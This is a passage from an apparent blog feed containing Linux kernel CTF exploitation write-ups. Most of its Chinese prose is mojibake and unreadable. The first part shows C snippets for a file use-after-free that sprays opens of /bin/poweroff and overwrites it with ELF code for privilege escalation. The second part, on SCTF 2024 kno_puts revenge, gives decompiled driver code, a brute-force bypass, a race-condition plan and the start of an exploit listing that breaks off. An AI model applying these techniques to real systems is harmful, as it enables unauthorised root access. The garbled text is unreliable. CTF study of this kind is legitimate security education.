æ¼æ´ã€‚<br>æˆ‘ä»¬å¯ä»¥å…ˆç”¨è¯»å†™æƒé™æ¥æ‰“å¼€ä¸€ä¸ªæ™®é€šç”¨æˆ·å…·æœ‰è¯»å†™æƒé™çš„æ–‡ä»¶å¹¶å°†å…¶ä½œä¸ºå°†è¦ uaf çš„æ–‡ä»¶ï¼Œç„¶åç”¨ mmap æ¥æ˜ å°„æˆ‘ä»¬å°†è¦ uaf çš„æ–‡ä»¶:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> dummy_fd = open(<span class="string">&quot;/tmp/sh&quot;</span>, O_RDWR | O_TRUNC | O_CREAT);</span><br><span class="line"><span class="keyword">if</span> (dummy_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;create&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">fchmod(dummy_fd, <span class="number">0777</span>);</span><br><span class="line">close(dummy_fd);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> uaf_file = open(<span class="string">&quot;/tmp/sh&quot;</span>,O_RDWR);</span><br><span class="line"><span class="keyword">if</span>(uaf_file &lt; <span class="number">0</span>)&#123;</span><br><span class="line">    err_exit(<span class="string">&quot;open low level file.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *data = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, uaf_file, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>ç„¶åå¤šæ¬¡è°ƒç”¨ fput å°†è¿™ä¸ªæ–‡ä»¶å¯¹åº”çš„ file-&gt;f_count å°†å…¶ç½®ä¸ºé›¶ä½¿å…¶è¢«é‡Šæ”¾ï¼Œä½† mmap ä»ç„¶å…·æœ‰é“¾æ¥åˆ°è¯¥å·²é‡Šæ”¾å—çš„æ‰“å¼€çš„æ–‡ä»¶æè¿°ç¬¦ã€‚ç„¶åå¤§é‡ä»¥åªè¯»æƒé™æ¥æ‰“å¼€æˆ‘ä»¬æƒ³è¦è¶Šæƒå†™çš„æ–‡ä»¶ï¼Œç¡®ä¿æˆ‘ä»¬ä¹‹å‰çš„ uaf file èƒ½å¤Ÿè¢«é‡æ–°ä½¿ç”¨ï¼Œè¿™é‡Œæˆ‘é€‰æ‹©å–·å°„çš„æ–‡ä»¶ä¸º &#x2F;bin&#x2F;poweroffã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[*] Begin to spray file.&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x300</span>; i++)&#123;</span><br><span class="line">    spray_file[i] = open(<span class="string">&quot;/bin/poweroff&quot;</span>,O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (spray_file[i] &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;spray file failed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”±äº mmap æ˜¯ä»¥å†™æƒé™å¯åŠ¨çš„ï¼Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹ mmap æŒ‡å‘çš„å—çš„å†…å®¹ï¼Œå°½ç®¡å®ƒæœ€åˆå…·æœ‰åªè¯»è®¿é—®æƒé™ï¼Œæ­¤æ—¶æˆ‘ä»¬å³å¯è¶Šæƒä¿®æ”¹ &#x2F;bin&#x2F;poweroff æ–‡ä»¶ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memcpy</span>(data, elfcode, <span class="keyword">sizeof</span>(elfcode));</span><br></pre></td></tr></table></figure><p>æ•ˆæœå¦‚ä¸‹ï¼š</p><img src="/2024/11/12/fileuaf/17.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>å‘œå‘œå‘œï¼ŒäºŒè¿›åˆ¶çœŸçš„å¤ªå¥½ç©äº†ï¼Œå¯æ˜¯èƒ½ç»™æˆ‘ç©çš„æ—¶é—´ä¸å¤šäº†&#x2F;(ã„’oã„’)&#x2F;~~</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg2MzU3Mjc3Ng==&mid=2247488477&idx=1&sn=f8531b3220ea3a9ca2a0fdc2fd9dabc6&chksm=ce77d59af9005c8c2ef35c7e45f45cbfc527bfc4b99bbd02dbaaa964d174a4009897dd329a4d&scene=178&cur_album_id=2559805446807928833#rd">ä¸€æ­¥ä¸€å›¾å¸¦ä½ æ„å»º Linux é¡µè¡¨ä½“ç³» â€”â€” è¯¦è§£è™šæ‹Ÿå†…å­˜å¦‚ä½•ä¸ç‰©ç†å†…å­˜è¿›è¡Œæ˜ å°„ (qq.com)</a></p><p><a href="https://ptr-yudai.hatenablog.com/entry/2023/12/08/093606">Understanding Dirty Pagetable - m0leCon Finals 2023 CTF Writeup - CTFã™ã‚‹ã (hatenablog.com)</a></p><p><a href="https://yanglingxi1993.github.io/dirty_pagetable/dirty_pagetable.html">Dirty_Pagetable (yanglingxi1993.github.io)</a></p><p><a href="https://syst3mfailure.io/corjail/">[corCTF 2022] CoRJail: From Null Byte Overflow To Docker Escape Exploiting poll_list Objects In The Linux Kernel (syst3mfailure.io)</a></p><p><a href="https://www.52pojie.cn/thread-1849189-1-1.html">corCTF2022-corjail</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ä¸€é¢˜å¤šè§£ SCTF 2024 kno_puts revenge</title>
      <link href="/2024/10/07/kno_puts/"/>
      <url>/2024/10/07/kno_puts/</url>
      
        <content type="html"><![CDATA[<h2 id="Begin"><a href="#Begin" class="headerlink" title="Begin"></a>Begin</h2><p>åˆæœ‰ kernel å•¦  </p><img src="/2024/10/07/kno_puts/1.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å¥½ä¹…æ²¡çœ‹ <code>kernel</code> äº†ï¼Œåˆšå¥½ <code>SCTF</code> ä¸Šå°±æ¥äº†ä¸€é“ç®€å•é¢˜ã€‚ç»“æœç”±äºç”Ÿç–äº†æ‰“çš„å·¨æ…¢ï¼Œè¿è¡€éƒ½æ²¡æ‹¿åˆ°ğŸ˜­ï¼ˆ4è¡€ï¼‰ä¸Šå›¾ä¸ºæ¯”èµ›æ—¶æ‰“é€šçš„æˆªå›¾ã€‚</p><p>ç”±äºé¢˜ç›®æ¯”è¾ƒç®€å•ï¼Œæ‰€ä»¥æˆ‘æ‰“ç®—ç”¨å¤šç§æ‰“æ³•æ¥è§£å†³è¿™é“é¢˜ç›®ï¼ŒåŒæ—¶ä¹Ÿå½“ä½œæ˜¯å¯¹ <code>kernel</code> çš„åº·å¤è®­ç»ƒã€‚è¿™ç¯‡æ–‡ç« åªæ˜¯å¯¹é¢˜ç›®è¿›è¡Œå„ç§æ”»å‡»æ‰‹æ®µçš„åˆ†æï¼Œä¸ä¼šå¯¹æ¯ä¸ªå†…æ ¸ç»“æ„ä½“çš„ç»“æ„ä»¥åŠæ”»å‡»æ‰‹æ³•çš„å…·ä½“åŸç†è¿›è¡Œè¯¦ç»†çš„è®²è§£ã€‚æœ¬ç¯‡æ–‡ç« æˆ‘ä¼šé€æ­¥å¢åŠ é¢˜ç›®çš„é™åˆ¶ï¼Œç„¶åä»ä½çº§åˆ°é«˜çº§ç”¨ä¸åŒçš„æ”»å‡»æ‰‹æ®µå¯¹é¢˜ç›®è¿›è¡Œæ±‚è§£ã€‚</p><h2 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h2><h3 id="å…³é”®ä»£ç ï¼š"><a href="#å…³é”®ä»£ç ï¼š" class="headerlink" title="å…³é”®ä»£ç ï¼š"></a>å…³é”®ä»£ç ï¼š</h3><h4 id="ioctl"><a href="#ioctl" class="headerlink" title="ioctl"></a>ioctl</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">my_module_ioctl</span><span class="params">(__int64 a1, <span class="type">int</span> a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *v5; <span class="comment">// [rsp+30h] [rbp-E0h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+60h] [rbp-B0h]</span></span><br><span class="line">  <span class="type">char</span> s1[<span class="number">8</span>]; <span class="comment">// [rsp+94h] [rbp-7Ch] BYREF</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+9Ch] [rbp-74h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+A4h] [rbp-6Ch]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+ACh] [rbp-64h]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [rsp+B4h] [rbp-5Ch]</span></span><br><span class="line">  _QWORD v12[<span class="number">4</span>]; <span class="comment">// [rsp+B8h] [rbp-58h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v13; <span class="comment">// [rsp+D8h] [rbp-38h]</span></span><br><span class="line">  __int64 v14; <span class="comment">// [rsp+E0h] [rbp-30h]</span></span><br><span class="line">  <span class="type">char</span> s2[<span class="number">32</span>]; <span class="comment">// [rsp+E8h] [rbp-28h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v16; <span class="comment">// [rsp+108h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v16 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  *(_QWORD *)s1 = <span class="number">0LL</span>;</span><br><span class="line">  v8 = <span class="number">0LL</span>;</span><br><span class="line">  v9 = <span class="number">0LL</span>;</span><br><span class="line">  v10 = <span class="number">0LL</span>;</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  get_random_bytes(s2, <span class="number">32LL</span>);</span><br><span class="line">  check_object_size(v12, <span class="number">48LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( copy_from_user(v12, a3, <span class="number">48LL</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-14LL</span>;</span><br><span class="line">  printk(&amp;unk_837);</span><br><span class="line">  *(_QWORD *)s1 = v12[<span class="number">0</span>];</span><br><span class="line">  v8 = v12[<span class="number">1</span>];</span><br><span class="line">  v9 = v12[<span class="number">2</span>];</span><br><span class="line">  v10 = v12[<span class="number">3</span>];</span><br><span class="line">  LOBYTE(v11) = v13;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(s1, s2, <span class="number">0x20</span>uLL) )</span><br><span class="line">    v11 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v11 != <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-13LL</span>;</span><br><span class="line">  printk(&amp;unk_84D);</span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">0xFFF0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !v14 || ptr )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">    ptr = (<span class="type">void</span> *)_kmalloc(<span class="number">736LL</span>, <span class="number">3264LL</span>);</span><br><span class="line">    <span class="built_in">memset</span>(ptr, <span class="number">0</span>, <span class="number">0x2E0</span>uLL);</span><br><span class="line">    printk(&amp;unk_768);</span><br><span class="line">    v6 = v14;</span><br><span class="line">    check_object_size(&amp;ptr, <span class="number">8LL</span>, <span class="number">1LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( copy_to_user(v6, &amp;ptr, <span class="number">8LL</span>) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( a2 == <span class="number">0xFFF1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v14 )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">    v5 = ptr;</span><br><span class="line">    <span class="keyword">if</span> ( ptr )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( fchoice )</span><br><span class="line">      &#123;</span><br><span class="line">        ptr = <span class="number">0LL</span>;</span><br><span class="line">        kfree(v5);</span><br><span class="line">        fchoice = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="write"><a href="#write" class="headerlink" title="write"></a>write</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">module_write</span><span class="params">(__int64 a1, __int64 a2, <span class="type">unsigned</span> __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *v5; <span class="comment">// [rsp+30h] [rbp-28h]</span></span><br><span class="line"></span><br><span class="line">  printk(&amp;unk_820);</span><br><span class="line">  <span class="keyword">if</span> ( a3 &gt; <span class="number">0x2E0</span> || !ptr )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  v5 = ptr;</span><br><span class="line">  check_object_size(ptr, a3, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">int</span>)copy_from_user(v5, a2, a3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="éšæœºæ•°ç»•è¿‡"><a href="#éšæœºæ•°ç»•è¿‡" class="headerlink" title="éšæœºæ•°ç»•è¿‡"></a>éšæœºæ•°ç»•è¿‡</h3><p>å¯ä»¥çœ‹åˆ°é¢˜ç›®ä¼šå…ˆç”Ÿæˆä¸€ä¸ª <code>32</code> ä½çš„éšæœºæ•°ç„¶åå’Œæˆ‘ä»¬è‡ªå·±çš„å­—ç¬¦ä¸²è¿›è¡Œæ¯”è¾ƒï¼Œè¦æ¯”è¾ƒé€šè¿‡æ‰å¯ä»¥è¿›è¡Œåé¢çš„æ“ä½œã€‚è¿™é‡Œå¬è¯´æœ‰æŒºå¤šç§ç»•è¿‡æ–¹æ³•ï¼Œä½†ç”±äºè¿™ä¸æ˜¯é‡ç‚¹ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘åªç”¨æˆ‘è‡ªå·±çš„æ–¹æ³•ã€‚æˆ‘ä»¬å¯ä»¥èµŒéšæœºæ•°çš„ç¬¬ä¸€ä½æ˜¯ <code>\x00</code>ï¼Œè¿™ä¸ªæ—¶å€™æ¯”è¾ƒå°±ä¼šåªæ¯”è¾ƒç¬¬ä¸€ä½ <code>\x00</code>ï¼Œå†™ä¸ªå¾ªç¯çˆ†ç ´å³å¯ï¼Œæˆ‘çš„ <code>add</code> å’Œ <code>del</code> å‡½æ•°å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> v14[<span class="number">0x100</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Begin add.&quot;</span>);</span><br><span class="line">    vuln.e = (<span class="type">size_t</span>)v14;</span><br><span class="line">    <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">        <span class="type">int</span> result = ioctl(fd, <span class="number">0xFFF0</span>, &amp;vuln);</span><br><span class="line">        <span class="keyword">if</span>(result != <span class="number">-1</span>)&#123;</span><br><span class="line">            info(<span class="string">&quot;Add success.&quot;</span>);</span><br><span class="line">            heap_addr = *(<span class="type">size_t</span>*)vuln.e;</span><br><span class="line">            hexx(<span class="string">&quot;heap_addr&quot;</span>, heap_addr);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">del</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Begin delete&quot;</span>);</span><br><span class="line">    vuln.e = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">        <span class="type">int</span> result = ioctl(fd, <span class="number">0xFFF1</span>, &amp;vuln);</span><br><span class="line">        <span class="keyword">if</span>(result != <span class="number">-1</span>)&#123;</span><br><span class="line">            info(<span class="string">&quot;Delete success.&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><p>å¯ä»¥å‘ç°è¿™ä¸ªå†…æ ¸é©±åŠ¨å¹¶æ²¡æœ‰ä¸Šé”ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ¡ä»¶ç«äº‰æ¥åˆ›é€ å‡º <code>UAF</code>ï¼Œå³åœ¨ <code>write</code> å‡½æ•°æ‰§è¡Œ <code>copy_from_user</code> å‰è°ƒç”¨ <code>kfree</code> è®²å †å—é‡Šæ”¾æ‰ï¼Œè¿™ä¸ªæ—¶å€™å°±ä¼šå‡ºç° <code>UAF</code></p><p>åœ¨è¿›è¡Œå †å—åˆ›å»ºçš„æ—¶å€™ï¼Œå¯ä»¥çœ‹è§æœ‰ä¸€ä¸ª copy_to_user å‡½æ•°è¢«è°ƒç”¨ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¥æ³„éœ²å‡ºå †åœ°å€</p><h2 id="notes-leak-userfaultfd-tty-struct-rt-regs"><a href="#notes-leak-userfaultfd-tty-struct-rt-regs" class="headerlink" title="notes leak + userfaultfd + tty_struct + rt_regs"></a>notes leak + userfaultfd + tty_struct + rt_regs</h2><h3 id="æ€è·¯åˆ†æ"><a href="#æ€è·¯åˆ†æ" class="headerlink" title="æ€è·¯åˆ†æ"></a>æ€è·¯åˆ†æ</h3><p>è¿™æ˜¯ç¬”è€…æˆ‘æ¯”èµ›æ—¶æ‰€ä½¿ç”¨çš„è§£æ³•ï¼ŒåŒæ—¶ä¹Ÿåº”è¯¥æ˜¯æœ€å¥½æƒ³ã€æœ€ç›´æ¥ã€æœ€é¢„æœŸï¼ˆæˆ‘çŒœçš„ï¼‰çš„è§£æ³•ã€‚ä»ä¸€ä¸ªå†…æ ¸åˆå­¦è€…çš„è§’åº¦æ¥æƒ³ï¼Œåš <code>kernel pwn</code> è‚¯å®šè¦å…ˆæ³„éœ²å†…æ ¸åœ°å€ï¼Œå¾€å¾€è¿™å¹¶ä¸ç®€å•ï¼Œä½†è¿™é¢˜çš„å†…æ ¸åŸºå€æ˜¯ç™½ç»™çš„ï¼ï¼ï¼å…·ä½“åŸç†å¯ä»¥å‚è€ƒæˆ‘åŠå¹´å‰çš„åšå®¢<a href="https://qanux.github.io/2024/04/17/notes/">When ELF notes reveal too much | Qanuxâ€™s space</a></p><img src="/2024/10/07/kno_puts/2.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>ç®€å•çš„æ¥è¯´ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ä» <code>/sys/kernel/notes</code> ä¸­ç›´æ¥è·å–å†…æ ¸çš„åœ°å€ã€‚å…¶æ¬¡æ˜¯å †åœ°å€ï¼Œå †åœ°å€çš„è·å–æ–¹æ³•å·²ç»å†™åœ¨é¢˜ç›®åˆ†æéƒ¨åˆ†äº†ï¼Œè¿™é‡Œä¸å†è¿›è¡Œè®²è¿°ã€‚</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬å…³æ³¨åˆ°çš„æ˜¯ä»–çš„ <code>add</code> æ“ä½œæ˜¯é€šè¿‡ <code>kmalloc</code> ç”³è¯·äº† <code>736</code> å­—èŠ‚çš„å†…å­˜ï¼Œè¿™ä¸ªå¤§å°åˆšå¥½æ˜¯ <code>tty_struct</code> ç»“æ„ä½“çš„å¤§å°ï¼Œè¿™ä¸æ˜¯æ‘†æ˜ç€è¦æˆ‘ä»¬é€šè¿‡åŠ«æŒ <code>tty_struct</code> çš„ <code>ops</code> æ¥å®ç°ç¨‹åºæµçš„æ§åˆ¶ï¼Ÿæˆ‘ä»¬å…ˆæ¥æŸ¥çœ‹å†…æ ¸çš„ç‰ˆæœ¬</p><img src="/2024/10/07/kno_puts/3.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å¯ä»¥å‘ç°å†…æ ¸çš„ç‰ˆæœ¬æ¯”è¾ƒä½ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>userfaultfd</code> æ¥å°†ç¨‹åºå¡åœ¨ <code>copy_from_user</code>ã€‚æ¥ä¸‹æ¥æˆ‘ä»¬çš„ç›®æ ‡å°±æ˜¯åœ¨å†…æ ¸çš„æŸä¸ªä½ç½®å†™ä¸Š <code>kernel rop</code> ç„¶åé€šè¿‡åŠ«æŒ <code>tty_struct</code> æ ˆè¿ç§»åˆ°æˆ‘ä»¬çš„ <code>kernel rop</code> ä¸Šå»ã€‚å…¶å®è¿™é‡Œå¯ä»¥ç›´æ¥å°† <code>kernel rop</code> å†™é“ <code>tty_struct</code> ä¸Šç„¶åè¿›è¡Œä¸¤æ¬¡æ ˆè¿ç§»è·³è½¬åˆ°æˆ‘ä»¬çš„ <code>rop</code> ä¸Šï¼Œå¯æ˜¯æˆ‘æ‡’ï¼Œå®Œå…¨æ²¡è€ƒè™‘è¦è¿™ä¹ˆåšğŸ˜‡</p><p>ç„¶åæˆ‘å¹¸è¿çš„å‘ç°ï¼Œè¿™ä¸ªå†…æ ¸çš„ <code>pt_regs</code> å¹¶æ²¡æœ‰å¼€å¯éšæœºåŒ–ï¼Œä¹Ÿå°±æ˜¯è¯´å½“å†…æ ¸æ‰§è¡Œ <code>tty_struct</code> è™šè¡¨ä¸Šçš„å‡½æ•°æ—¶è¯¥ç»“æ„ä¸ <code>rsp</code> çš„è·ç¦»ä¸ä¼šå˜ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥å°† <code>kernel rop</code> å¸ƒå±€åˆ°è¿™ä¸ªä½ç½®ç„¶åä¼ªé€  <code>tty_struct ops</code> ç›´æ¥æ ˆè¿ç§»åˆ°æˆ‘ä»¬å¸ƒå±€å¥½çš„ <code>kernel rop</code> ä¸Šå®ç°ææƒ</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>ç”±äºæ¯”èµ›æ—¶æ¯”è¾ƒç´§å¼ ï¼ˆæƒ³æ‹¿è¡€ï¼‰ï¼Œè€Œä¸”é‡åˆ°äº†å¾ˆå¤šæ„å¤–å¿ƒæ€æœ‰ç‚¹å°å´©ï¼Œæ‰€ä»¥ <code>exp</code> å†™çš„æœ‰ç‚¹éš¾çœ‹ï¼Œå¯æ˜¯ä¸æƒ³æ”¹äº† :-)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span 